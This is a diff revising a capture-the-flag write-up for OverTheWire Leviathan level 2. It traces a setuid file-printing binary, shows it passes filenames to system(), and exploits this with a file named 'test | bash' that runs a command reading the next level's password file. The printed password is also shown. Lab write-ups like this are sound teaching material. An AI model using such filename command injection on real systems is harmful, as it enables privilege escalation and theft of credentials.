@@ -8,9 +8,9 @@ You can watch the walkthrough for this level here:
 
 ---
 
-## 🔍 Solution
+## 🔍 Exploration
 
-We begin by inspecting the current directory and the binary founded:
+We begin by inspecting the current directory and the discovered binary:
 
 ```bash
 leviathan2@gibson:~$ ls -l
@@ -20,13 +20,15 @@ leviathan2@gibson:~$ file printfile
 printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
 ```
 
-Once we checked the file, and see that it has SUID permissions, let's explore what the binary is doing:
+The binary has SUID permissions and requests a file to print:
+
 ```bash
 leviathan2@gibson:~$ ./printfile 
 *** File Printer ***
 Usage: ./printfile filename
 ```
-This binary asks for a file, then let's give one:
+Let’s test it:
+
 ```bash
 leviathan2@gibson:~$ ls -a 
 .  ..  .bash_logout  .bashrc  printfile  .profile
@@ -150,7 +152,8 @@ if ! shopt -oq posix; then
 fi
 ```
 
-We can see that the binary basically is reading the file we give. As the file is a dynamic binary we can use `ltrace` to see how it works:
+We use `ltrace` to trace library calls:
+
 ```bash
 leviathan2@gibson:~$ ltrace ./printfile .bashrc 
 __libc_start_main(0x80490ed, 2, 0xffffd384, 0 <unfinished ...>
@@ -282,7 +285,8 @@ fi
 +++ exited (status 0) +++
 ```
 
-Let's focus on a key point that we can see in the  output:
+It builds and executes the command `/bin/cat <filename>` via `system()` . This suggests a command injection vulnerability:
+
 ```bash
 leviathan2@gibson:~$ ltrace ./printfile .bashrc 
 __libc_start_main(0x80490ed, 2, 0xffffd384, 0 <unfinished ...>
@@ -298,13 +302,17 @@ We can see that what is using the binary is a `/bin/cat` for the file we are giv
 
 ## 💣 Exploitation
 
-Then we can proceed to create a temporary directory to test how to exploit it. Points to test:
 
-- The binary check that the name of the file that you use exist.
-- The name of the file should content the command to applied the output of `/bin/cat`
+With a deeper exploration (as shown in the walkthrough), we can determine two key points for the exploitation:
 
- Then, we create a temporary directory where we will keep the files we create. First we create a file to contain the command that we want to execute, for example to read the password of Leviathan3. Then we will create a second file, the file we will inject to the binary, with the name of the previos file and a command to execute it.
- Temporary directory:
+- The filename must include a command that manipulates the output of `/bin/cat`.
+- The binary checks whether the file **exists** before executing the command via `system()`.
+
+This opens the door for **command injection** by crafting a filename that includes a pipe (`|`) to redirect the output of `/bin/cat` into a command of our choice (e.g., `bash`).
+
+---
+
+### Step 1: Create a temporary working directory
  ```bash
 leviathan2@gibson:~$ mktemp -d
 /tmp/tmp.tXQrG5v6Ix
@@ -313,22 +321,23 @@ leviathan2@gibson:~$ cd /tmp/tmp.tXQrG5v6Ix
 leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$
 ```
 
- File **test**:
+### Step 2: Create a payload file
  ```bash
 leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ echo 'cat /etc/leviathan_pass/leviathan3' > test
 leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ cat test
 cat /etc/leviathan_pass/leviatan3
 ```
 
-File **injection**:
+### Step 3: Create a malicious file name that will be executed
 ```bash
 viathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ touch "test | bash"
 leviathan2@gibson:/tmp/tmp.tXQrG5v6Ix$ ls
 test  test | bash
 ```
 
-The file "injection" does not need content, because the binary what is going to do is: `system(/bin/cat test | bash)`. Then first read the file test and then it execute with bash the ouput, in our case, it will read the pass.
+This will trigger the following when passed to the binary:`/bin/cat test | bash`
 
+### Step 4: Run the exploit
 ```bash
 leviathan2@gibson:~$ ./printfile "/tmp/tmp.tXQrG5v6Ix/test | bash"
 f0n8h2iWLP
